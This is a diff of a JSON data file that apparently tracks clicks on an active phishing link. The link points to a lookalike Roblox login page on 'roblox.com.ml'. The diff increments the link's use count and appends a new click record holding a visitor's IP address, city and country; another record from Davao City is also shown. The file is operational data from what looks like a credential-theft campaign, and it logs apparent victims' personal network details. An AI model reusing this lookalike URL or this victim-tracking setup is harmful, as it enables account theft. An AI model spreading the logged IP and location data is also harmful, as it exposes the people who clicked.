@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 85,
+    "useCount": 86,
     "createdBy": "admin",
     "clicks": [
       {
@@ -792,6 +792,14 @@
         "city": "Davao City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1776910683431,
+        "ip": "100.0.174.191",
+        "country": "United States",
+        "city": "Boston",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
